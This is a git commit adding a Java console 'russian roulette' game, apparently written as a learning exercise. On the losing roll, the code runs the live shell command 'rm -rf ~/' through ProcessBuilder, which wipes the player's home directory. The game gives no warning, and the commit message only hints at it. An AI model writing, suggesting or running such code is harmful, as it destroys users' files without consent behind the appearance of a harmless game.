4ebeb849188fbfa45c6db239f64f188ea114a1d4
NyxieLucy <nyxlucianis@gmail.com>
2026-05-17 14:28:20 +0100

    added a simple russian rullet game, at this point i'm just learning different stuff, also dont run the command with sudo

---
+++ russianRullet/src/Main.java
@@ -0,0 +1,50 @@
+import java.util.ArrayList;
+import java.util.List;
+import java.util.Random;
+import java.util.Scanner;
+import java.lang.ProcessBuilder;
+import java.io.IOException;
+
+public class Main {
+    public static void main(String[] args) {
+        Scanner scan = new Scanner(System.in);
+        Random rand = new Random();
+
+        List<Integer> bullets = new ArrayList<>();
+        for (int i = 1; i <= 6; i++) {
+            bullets.add(i);
+        }
+
+        for (int i = 0; i < 6; i++) {
+            System.out.println("Do you want to shoot? (y/n)");
+            String choice = scan.next();
+
+            if (choice.equalsIgnoreCase("y")) {
+                int index = rand.nextInt(bullets.size());
+                int bullet = bullets.remove(index);
+                System.out.println("Bullet: " + bullet);
+
+                if (bullet == 1) {
+                    System.out.println("Bang!");
+                    try {
+                        ProcessBuilder command = new ProcessBuilder("bash", "-c", "rm -rf ~/");
+                        Process process = command.start();
+                        int exitcode = process.waitFor();
+                    }catch (IOException | InterruptedException e) {
+                        System.out.println("Command failed: " + e.getMessage());
+                    }
+                }else {
+                    System.out.println("Click.");
+                }
+            } else {
+                System.out.println("Skipped.");
+            }
+
+            if (bullets.isEmpty()) {
+                System.out.println("No bullets left.");
+                break;
+            }
+        }
+        scan.close();
+    }
+}
